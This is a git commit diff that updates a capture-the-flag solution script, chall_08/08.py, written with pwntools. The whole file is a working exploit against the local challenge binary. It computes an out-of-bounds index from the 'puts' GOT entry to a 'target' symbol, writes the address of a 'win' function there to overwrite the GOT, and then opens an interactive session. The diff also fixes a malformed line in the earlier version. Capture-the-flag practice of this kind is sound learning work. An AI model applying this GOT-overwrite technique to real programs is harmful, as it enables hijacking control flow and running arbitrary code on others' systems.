b4af765d1517e3a54392e08b1ed499b173f14eca
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-05-11 18:49:44 -0400

    #FINISHED

--- chall_08/08.py
+++ chall_08/08.py
@@ -1,7 +1,7 @@
 from pwn import *
 binary = context.binary = ELF('./chall_08')
 p = process(binary.path)
-p.sendline(binary.got.puts - binary.sym.target) // 8)
-p.sendline(binary.sym.win)
+p.sendline(str(binary.sym.win))
+p.sendline(str((binary.got.puts - binary.sym.target)//8))
 p.interactive()
-#NOT FINISHED
+#FINISHED
